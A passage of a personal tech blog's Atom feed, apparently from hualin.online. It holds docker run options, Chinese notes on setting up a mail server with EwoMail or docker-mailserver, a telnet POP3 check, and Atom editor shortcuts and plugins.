--disable-content-trust       Skip image verification (default true)    --dns value                   Set custom DNS servers (default [])    --dns-opt value               Set DNS options (default [])    --dns-search value            Set custom DNS search domains (default [])    --entrypoint string           Overwrite the default ENTRYPOINT of the image-e, --env value                   Set environment variables (default [])    --env-file value              Read in a file of environment variables (default [])    --expose value                Expose a port or a range of ports (default [])    --group-add value             Add additional groups to join (default [])    --health-cmd string           Command to run to check health    --health-interval duration    Time between running the check    --health-retries int          Consecutive failures needed to report unhealthy    --health-timeout duration     Maximum time to allow one check to run    --help                        Print usage-h, --hostname string             Container host name-i, --interactive                 Keep STDIN open even if not attached    --io-maxbandwidth string      Maximum IO bandwidth limit for the system drive (Windows only)    --io-maxiops uint             Maximum IOps limit for the system drive (Windows only)    --ip string                   Container IPv4 address (e.g. 172.30.100.104)    --ip6 string                  Container IPv6 address (e.g. 2001:db8::33)    --ipc string                  IPC namespace to use    --isolation string            Container isolation technology    --kernel-memory string        Kernel memory limit-l, --label value                 Set meta data on a container (default [])    --label-file value            Read in a line delimited file of labels (default [])    --link value                  Add link to another container (default [])    --link-local-ip value         Container IPv4/IPv6 link-local addresses (default [])    --log-driver string           Logging driver for the container    --log-opt value               Log driver options (default [])    --mac-address string          Container MAC address (e.g. 92:d0:c6:0a:29:33)-m, --memory string               Memory limit    --memory-reservation string   Memory soft limit    --memory-swap string          Swap limit equal to memory plus swap: &#39;-1&#39; to enable unlimited swap    --memory-swappiness int       Tune container memory swappiness (0 to 100) (default -1)    --name string                 Assign a name to the container    --network string              Connect a container to a network (default &amp;quot;default&amp;quot;)    --network-alias value         Add network-scoped alias for the container (default [])    --no-healthcheck              Disable any container-specified HEALTHCHECK    --oom-kill-disable            Disable OOM Killer    --oom-score-adj int           Tune host&#39;s OOM preferences (-1000 to 1000)    --pid string                  PID namespace to use    --pids-limit int              Tune container pids limit (set -1 for unlimited)    --privileged                  Give extended privileges to this container-p, --publish value               Publish a container&#39;s port(s) to the host (default [])-P, --publish-all                 Publish all exposed ports to random ports    --read-only                   Mount the container&#39;s root filesystem as read only    --restart string              Restart policy to apply when a container exits (default &amp;quot;no&amp;quot;)    --rm                          Automatically remove the container when it exits    --runtime string              Runtime to use for this container    --security-opt value          Security Options (default [])    --shm-size string             Size of /dev/shm, default value is 64MB    --sig-proxy                   Proxy received signals to the process (default true)    --stop-signal string          Signal to stop a container, 15 by default (default &amp;quot;15&amp;quot;)    --storage-opt value           Storage driver options for the container (default [])    --sysctl value                Sysctl options (default map[])    --tmpfs value                 Mount a tmpfs directory (default [])-t, --tty                         Allocate a pseudo-TTY    --ulimit value                Ulimit options (default [])-u, --user string                 Username or UID (format: &amp;lt;name|uid&amp;gt;[:&amp;lt;group|gid&amp;gt;])    --userns string               User namespace to use    --uts string                  UTS namespace to use-v, --volume value                Bind mount a volume (default [])    --volume-driver string        Optional volume driver for the container    --volumes-from value          Mount volumes from the specified container(s) (default [])-w, --workdir string              Working directory inside the container</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;useful-command&quot;&gt;&lt;a href=&quot;#useful-command&quot; class=&quot;headerlink&quot; title=&quot;useful command&quot;&gt;&lt;/a&gt;useful command&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;  docker run
        
      
    
    </summary>
    
      <category term="翻译Wiki" scheme="https://hualin.online/categories/%E7%BF%BB%E8%AF%91Wiki/"/>
    
    
  </entry>
  
  <entry>
    <title>docker+mailserver</title>
    <link href="https://hualin.online/dockermailserver/"/>
    <id>https://hualin.online/dockermailserver/</id>
    <published>2019-09-08T13:04:33.000Z</published>
    <updated>2019-09-10T01:53:02.760Z</updated>
    
    <content type="html"><![CDATA[<p>使用Ewomail搭建邮件服务器(需要纯洁系统环境) <a href="https://gitee.com/laowu5/EwoMail" target="_blank" rel="noopener">https://gitee.com/laowu5/EwoMail</a> <a href="https://gitee.com/laowu5/EwoMail.git" target="_blank" rel="noopener">https://gitee.com/laowu5/EwoMail.git</a> 后台管理端<a href="http://ip:8010" target="_blank" rel="noopener">http://ip:8010</a> 邮箱登录端<a href="http://IP:8000" target="_blank" rel="noopener">http://IP:8000</a> 使用docker运行mail容器: mkdir MailServer cd MailServer docker pull tvial/docker-mailserver:latest curl -o setup.sh <a href="https://raw.githubusercontent.com/tomav/docker-mailserver/master/setup.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/tomav/docker-mailserver/master/setup.sh</a>; chmod a+x ./setup.sh curl -o docker-compose.yml <a href="https://raw.githubusercontent.com/tomav/docker-mailserver/master/docker-compose.yml.dist" target="_blank" rel="noopener">https://raw.githubusercontent.com/tomav/docker-mailserver/master/docker-compose.yml.dist</a> curl -o .env <a href="https://raw.githubusercontent.com/tomav/docker-mailserver/master/.env.dist" target="_blank" rel="noopener">https://raw.githubusercontent.com/tomav/docker-mailserver/master/.env.dist</a> docker-compose up -d mail ./setup.sh email add &lt;user@domain&gt; [<password>] ./setup.sh config dkim 设置DNS域名解析: cat config/opendkim/keys/domain.tld/mail.txt 更新docker容器: docker-compose down docker pull tvial/docker-mailserver:latest docker-compose up -d mail 搭建邮箱服务器的方案: postfix dovecot postfix-admin(基本) iredmail, Ewomail(开源免费) sendcloud ,SendGrid、MailChimp、Amazon SES、SendCloud、Mailgun,Winmail、 Exchange、Mdaemon、Winwebmail、Imail、Coremail、U-Mail、TurboMail、iGENUS 、Icewarp、易邮、金笛、MagicMail等(收费)</password></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;使用Ewomail搭建邮件服务器(需要纯洁系统环境) &lt;a href=&quot;https://gitee.com/laowu5/EwoMail&quot; target=&quot;_blank&quot;
        
      
    
    </summary>
    
      <category term="docker" scheme="https://hualin.online/categories/docker/"/>
    
      <category term="Linux" scheme="https://hualin.online/categories/docker/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>telnet usage</title>
    <link href="https://hualin.online/telnet-usage/"/>
    <id>https://hualin.online/telnet-usage/</id>
    <published>2019-09-08T04:36:07.000Z</published>
    <updated>2019-09-10T01:53:02.760Z</updated>
    
    <content type="html"><![CDATA[<p>yum -y install telnet login dovecot: telnet 104.225.233.249 110 USER xxx：输入用户名 PASS xxx：输入密码 LIST：显示信箱 RETR n：打开第n封信 exit telnet： ctl+] quit</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;yum -y install telnet login dovecot: telnet 104.225.233.249 110 USER xxx：输入用户名 PASS xxx：输入密码 LIST：显示信箱 RETR n：打开第n封信 exit telnet： ctl+]
        
      
    
    </summary>
    
      <category term="Linux" scheme="https://hualin.online/categories/Linux/"/>
    
      <category term="未分类" scheme="https://hualin.online/categories/Linux/%E6%9C%AA%E5%88%86%E7%B1%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>Atom 使用技巧</title>
    <link href="https://hualin.online/atom-usage/"/>
    <id>https://hualin.online/atom-usage/</id>
    <published>2019-09-06T13:43:57.000Z</published>
    <updated>2019-09-10T01:53:02.760Z</updated>
    
    <content type="html"><![CDATA[<p># Atom ## 常用快捷键 + Crtl+Shift+M 开启Markdown实时预览 + Command+Shift+P 打开命令窗口，可以运行各种菜单功能 + Command + T 快速多文件切换 + Command + F 文件内查找和替换 + Command + Shift + F 多文件查找和替换 + Command + [ 对选中内容向左缩进 + Command + ] 对选中内容向右缩进 + Command + 显示或隐藏目录树 + Crtl + m 相应括号之间，html tag之间等跳转 + Crtl + Alt + B 格式化代码（需要安装atom-beautify） + Crtl + ` 调起CLI命令行界面（需要安装terminal-panel） ## 常用插件 + minimap： 预览全部代码 + atom-beautify： 格式化代码 Ctrl+Alt+B进行格式化 + emmet： HTML CSS 快速编写 + autcomplete-×系列： 代码自动补全 - autocompete-paths： 路径补全 - autocompete-php： PHP语言 + pigments： 样式显示颜色 + docblockr: 快捷注释 + JavaScript-snippets： js缩写，自动补全 + file-icons： 图片显示文件类型 ## 常用主题 + seti-ui + seti-syntax + atom-material-ui + atom-material-syntax</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;# Atom ## 常用快捷键 + Crtl+Shift+M 开启Markdown实时预览 + Command+Shift+P 打开命令窗口，可以运行各种菜单功能 + Command + T 快速多文件切换 + Command + F 文件内查找和替换 + Command
        
      
    
    </summary>
    
      <category term="Codes" scheme="https://hualin.online/categories/Codes/"/>
    
    
  </entry>
  
</feed>
